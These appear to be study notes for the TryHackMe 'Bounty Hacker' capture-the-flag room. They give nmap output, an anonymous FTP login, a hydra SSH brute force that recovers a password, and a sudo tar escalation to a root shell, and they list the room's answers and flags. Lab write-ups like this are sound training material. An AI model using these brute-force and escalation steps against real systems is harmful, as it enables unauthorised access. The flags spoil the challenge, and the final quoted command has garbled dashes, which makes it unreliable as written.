# Bounty Hacker

> Structured cybersecurity study notes converted from the source DOCX. Commands, indicators, answers, and investigation pivots are preserved for rapid reference.

## Find open ports on the machine

- "nmap 101.10.81.10" shows ports 21 (ftp), 22 (ssh), 80 (http)
- visited website (port 80) found static page
- checked for "robots.txt", but found no such file
- next nmap:
```text
root@ip-10-10-27-31:~# nmap -A -p 21,22,80 10.10.81.10
Starting Nmap 7.60 ( https://nmap.org ) at 2023-05-07 04:21 BST
Nmap scan report for ip-10-10-81-10.eu-west-1.compute.internal (10.10.81.10)
Host is up (0.00060s latency).
PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
| STAT:
| FTP server status:
| Connected to ::ffff:10.10.27.31
| Logged in as ftp
| TYPE: ASCII
| No session bandwidth limit
| Session timeout in seconds is 300
| Control connection is plain text
| Data connections will be plain text
| At session startup, client count was 4
| vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
| 256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_ 256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (EdDSA)
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

- "ftp 10.10.81.10": provided "anonymous" as name
- successful login
- two files "locks.txt" and "task.txt"
- "get locks.txt"
- "get task.txt"
### Who wrote the task list?

- "cat task.txt"
- **Answer:** lin
### What service can you bruteforce with the text file found?

- **Answer:** SSH
### What is the users password?

- "cat locks.txt | uniq | sort > locksSorted.txt"
- "hydra -L locksSorted.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.81.10"
- took way to long, quit this because I missed the obvious
- "hydra -l lin -P locksSorted.txt ssh://10.10.81.10"
- found password: "RedDr4gonSynd1cat3"
user.txt
- "THM{CR1M3_SyNd1C4T3}"
root.txt
- requires privilege escalation
- "sudo -l" reveals lin may execute /bin/tar with sudo
- gtfobins has a shell exploit: "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
- **Command to run:** `"sudo tar -cf /dev/null /dev/null - checkpoint=1 - checkpoint-action=exec=/bin/sh"`
- provides non-interaactive shell
- THM{80UN7Y_h4cK3r}
